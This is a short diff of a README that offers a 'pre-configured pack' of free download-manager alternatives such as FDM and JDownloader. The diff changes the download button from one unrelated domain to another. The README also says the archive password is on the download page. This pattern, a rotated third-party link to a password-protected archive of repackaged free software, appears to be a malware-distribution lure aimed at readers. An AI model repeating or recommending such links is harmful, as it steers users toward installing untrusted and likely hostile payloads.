@@ -18,7 +18,7 @@ Setup guide and pre-configured pack for best free IDM alternatives: FDM, JDownlo
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/idmfreealt2)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/idmfreealt2)
 
 > The archive password is shown on the download page.
 
